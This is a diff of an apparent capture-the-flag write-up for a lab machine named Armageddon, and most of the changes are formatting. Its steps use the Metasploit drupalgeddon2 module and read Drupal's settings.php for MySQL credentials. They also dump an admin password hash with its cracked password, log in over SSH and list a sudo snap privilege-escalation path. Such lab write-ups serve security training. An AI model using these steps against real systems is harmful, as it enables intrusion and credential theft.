@@ -20,12 +20,12 @@
 
 #### Techonologies
 
-CMS -  Drupal 7 
-Web sever - Apache/2.4.6
+CMS -  Drupal 7,
+Web sever - Apache/2.4.6,
 Prog Lang - PHP/5.4.16
 
 Got Metasploit exploit for Drupal 7
-https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/
+[https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/](https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/)
 
 After getting meterpreter session then open the shell and look for settings.php
 cd .. && cd html/sites/defalut && cat settings.php 
@@ -40,6 +40,7 @@ while look into settings.php got mysql credentials.
 	      'driver' => 'mysql',
 	      'prefix' => '',
 
+
 	$mysql -u drupaluser -h localhost -p
 
 	use drupal
@@ -47,13 +48,13 @@ while look into settings.php got mysql credentials.
 	;
 	show
 
-brucetherealadmin      $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt   admin@armageddon.eu
+brucetherealadmin     $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt   admin@armageddon.eu
 
 brucetherealadmin:booboo
 
 ssh brucetherealadmin@10.10.10.223
 
-# Privilege escalation
+## Privilege escalation
 
 sudo -l
 (root) NOPASSWD: /usr/bin/snap install *
